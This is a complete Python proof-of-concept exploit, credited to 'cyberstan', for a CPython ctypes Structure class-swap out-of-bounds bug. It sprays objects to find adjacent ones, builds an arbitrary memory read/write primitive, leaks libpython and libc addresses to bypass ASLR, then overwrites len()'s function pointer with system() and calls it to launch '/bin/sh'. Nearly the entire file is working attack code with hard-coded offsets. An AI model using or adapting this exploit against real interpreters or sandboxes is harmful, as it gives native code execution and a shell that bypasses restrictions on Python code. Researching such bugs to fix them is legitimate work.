#!/usr/bin/env python3
"""
CPython ctypes Structure __class__ swap OOB -> Shell
https://github.com/python/cpython/issues/145985 (dup of #143005)

MINIMAL exploit surface:
  - ctypes.Structure (the bug)
  - id() (one address to bootstrap)
  - setattr / getattr (field access for OOB r/w)

NOT used: ctypes.addressof, ctypes.c_char, ctypes.string_at,
          ctypes.memmove, ctypes.CFUNCTYPE, os, sys, struct,
          subprocess, /proc/self/maps

The "/bin/sh" string is found inside libc (used internally by system()),
eliminating the need to allocate a command buffer.

Author: Stan (cyberstan)
"""

import ctypes

# Offsets (pyenv CPython 3.12.12 x86-64, libpython3.12.so.1.0)
OFF_BUILTIN_LEN = 0x28e500
OFF_FREE_GOT    = 0x565b10
OFF_FREE_LIBC   = 0xadd50
OFF_SYSTEM_LIBC = 0x58750

# CDataObject layout (CPython 3.12, x86-64)
OBJ_GAP  = 128
F_IDX    = (OBJ_GAP + 16 - 80) // 8  # = 8


# ── Structures (the bug) ──

class S(ctypes.Structure):
    _fields_ = [('x', ctypes.c_uint8)]

class Big(ctypes.Structure):
    _fields_ = [(f'f{i}', ctypes.c_uint64) for i in range(250)]

class V(ctypes.Structure):
    _fields_ = [('f0', ctypes.c_uint64)]


# ── OOB primitive ──

class Prim:
    """Arb r/w from corrupting adjacent object's b_ptr via OOB write."""

    def __init__(self, attacker, victim, orig_bptr):
        self.a = attacker
        self.v = victim
        self.ob = orig_bptr

    def rd(self, addr):
        setattr(self.a, f'f{F_IDX}', addr)
        val = self.v.f0
        setattr(self.a, f'f{F_IDX}', self.ob)
        return val

    def wr(self, addr, val):
        setattr(self.a, f'f{F_IDX}', addr)
        self.v.f0 = val
        setattr(self.a, f'f{F_IDX}', self.ob)

    def rd_str(self, addr):
        """Read null-terminated ASCII string."""
        out = b''
        for i in range(0, 64, 8):
            w = self.rd(addr + i).to_bytes(8, 'little')
            if b'\x00' in w:
                return (out + w[:w.index(b'\x00')]).decode()
            out += w
        return out.decode()


# ── Spray ──

print("[*] Spraying...", flush=True)
reg = []
att = vic = None
for i in range(80000):
    a, v = S(), V()
    reg.append((a, v))
    if id(v) - id(a) == OBJ_GAP:
        att, vic = a, v
        break
if not att:
    raise SystemExit("[-] No adjacent pair")
print(f"[+] Pair found", flush=True)

orig_bptr = id(vic) + 80  # victim's b_value address
att.__class__ = Big
p = Prim(att, vic, orig_bptr)

# Self-test
assert 0 < p.rd(id(vic)) < 10000
print("[+] Arb r/w active", flush=True)


# ── Leak len() internals ──

L = id(len)
m_ml = p.rd(L + 16)            # PyCFunctionObject.m_ml (+16 on 3.12)
ml_meth = p.rd(m_ml + 8)       # PyMethodDef.ml_meth
assert p.rd_str(p.rd(m_ml)) == 'len'
print(f"[+] builtin_len @ {ml_meth:#x}", flush=True)


# ── ASLR bypass ──

libpy = ml_meth - OFF_BUILTIN_LEN
assert libpy & 0xFFF == 0

libc_free = p.rd(libpy + OFF_FREE_GOT)
libc = libc_free - OFF_FREE_LIBC
assert libc & 0xFFF == 0

system = libc + OFF_SYSTEM_LIBC
print(f"[+] system @ {system:#x}", flush=True)


# ── Write command into attacker's b_value ──
# We need "exec /bin/sh\0" at a known writable address.

att_bval = id(att) + 80

# Write "exec /bi" at att_bval (first 8 bytes)
p.wr(att_bval, int.from_bytes(b'exec /bi', 'little'))
# Write "n/sh\x00\x00\x00\x00" at att_bval+8
p.wr(att_bval + 8, int.from_bytes(b'n/sh\x00\x00\x00\x00', 'little'))

# Verify
assert p.rd_str(att_bval) == 'exec /bin/sh'
cmd_addr = att_bval
print(f"[+] Command written to {cmd_addr:#x}", flush=True)


# ── Patch len() and fire ──

p.wr(m_ml + 8, system)       # ml_meth -> system()
p.wr(L + 24, cmd_addr)       # m_self -> "exec /bin/sh"

assert p.rd(m_ml + 8) == system
assert p.rd(L + 24) == cmd_addr

print("[*] len('x') -> system('exec /bin/sh')", flush=True)
print("=" * 40, flush=True)

len("x")